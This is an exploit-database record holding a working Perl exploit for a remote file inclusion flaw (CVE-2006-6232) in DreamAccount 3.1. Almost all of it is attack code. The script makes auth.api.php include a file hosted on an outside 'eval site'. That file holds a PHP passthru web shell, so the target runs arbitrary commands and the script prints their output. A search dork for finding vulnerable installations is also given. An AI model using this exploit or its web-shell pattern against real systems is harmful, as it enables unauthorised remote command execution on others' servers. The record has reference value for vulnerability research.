{
  "id": "1954",
  "title": "DreamAccount 3.1 - &#039;auth.api.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-6232",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\nuse HTTP::Request;\r\nuse LWP::UserAgent;\r\n# ----------------------------------------------------\r\n# DREAMACCOUNT V3.1 Remote Command Execution Exploit    \r\n# ----------------------------------------------------\r\n# Discovered By CrAsh_oVeR_rIdE(Arabian Security Team)\r\n# Coded By Drago84(Exclusive Security Team)           \r\n# ----------------------------------------------------\r\n# site of script:http://dreamcost.com                 \r\n# ----------------------------------------------------\r\n# Vulnerable: DREAMACCOUNT V3.1                       \r\n# ----------------------------------------------------\r\n# vulnerable file :                                    \r\n# ------------------                                  \r\n# auth.api.php                                    \r\n# ----------------------------------------------------\r\n# vulnerable code:                                    \r\n# ----------------------------------------------------\r\n# require_once($path . 'mod_htaccess.inc.php');   // 0\r\n# require_once($path . 'mod_pmachine.inc.php');   // 4\r\n# require_once($path . 'mod_vbulletin.inc.php');  // 5\r\n# require_once($path . 'mod_phpbb.inc.php');      // 6\r\n# require_once($path . 'mod_postnuke.inc.php');   // 7\r\n# require_once($path . 'mod_phpnuke.inc.php');    // 8\r\n# require_once($path . 'mod_freeradius.inc.php'); // 9\r\n# require_once($path . 'mod_ldap.inc.php');       // 10\r\n# require_once($path . 'mod_invboard.inc.php');   // 11\r\n# require_once($path . 'mod_yabbse.inc.php');     // 12\r\n# require_once($path . 'mod_mambo.inc.php');      // 13\r\n# require_once($path . 'mod_xaraya.inc.php');     // 14\r\n# require_once($path . 'mod_geeklog.inc.php');    // 15\r\n#   \r\n# $path parameter File inclusion                      \r\n# ----------------------------------------------------\r\n# Exploit:\r\n# ---------\r\nprint \"\\n=============================================================================\\r\\n\";\r\nprint \" * Dreamaccount Remote Command Execution  23/06/06 *\\r\\n\";   \r\nprint \"=============================================================================\\r\\n\";\r\nprint \"[*] dork:\\\"powered by DreamAccount 3.1\\\"\\n\";\r\nprint \"[*] Coded By : Drago84 \\n\";\r\nprint \"[*] Discovered by CrAsH_oVeR_rIdE\\n\";\r\nprint \"[*] Use <site> <dir_Dream> <eval site> <cmd>\\n\";\r\nprint \" Into the Eval Site it must be:\\n\\n\";\r\nprint \" Exclusive <?php  passthru($_GET[cmd]); ?> /Exclusive\";\r\n\r\nif (@ARGV < 4)\r\n{\r\nprint \"\\n\\n[*] usage: perl dream.pl <site> <dir dream> <eval site> <cmd>\\n\";\r\nprint \"[*] usage: perl dream.pl www.HosT.com /dreamaccount/ http://www.site.org/doc.jpg id\\n\";\r\nprint \"[*] uid=90(nobody) gid=90(nobody) egid=90(nobody) \\n\";\r\nexit();\r\n}\r\nmy $dir=$ARGV[1];\r\nmy $host=$ARGV[0];\r\nmy $eval=$ARGV[2];\r\nmy $cmd=$ARGV[3];\r\nmy $url2=$host.$dir.\"auth.api.php?path=\".$eval.\"?&cmd=\".$cmd;\r\nprint \"\\n\";\r\nmy $req=HTTP::Request->new(GET=>$url2);\r\nmy $ua=LWP::UserAgent->new();\r\n$ua->timeout(10);\r\nmy $response=$ua->request($req);\r\nif ($response->is_success) {\r\nprint \"\\n\\nResult of:\".$cmd.\"\\n\";\r\nmy ($pezzo_utile) = ( $response->content =~ m{Exclusive(.+)\\/Exclusive}smx );\r\nprintf $1;\r\n$response->content;\r\nprint \"\\n\";\r\n\r\n} \r\n\r\n# ----------------------------------------------------------------------------------------------------\r\n# Discovered By CrAsh_oVeR_rIdE\r\n# Coded By  Drago84\r\n# E-mail:KARKOR23@hotmail.com\r\n# Site:www.lezr.com\r\n# Greetz:KING-HACKER,YOUNG_HACKER,SIMO,ROOT-HACKED,SAUDI,QPTAN,POWERWALL,SNIPER_SA,Black-Code,ALMOKAN3,Mr.hcR AND ALL LEZR.COM Member\r\n\r\n# milw0rm.com [2006-06-25]",
  "url": "https://www.exploit-db.com/exploits/1954"
}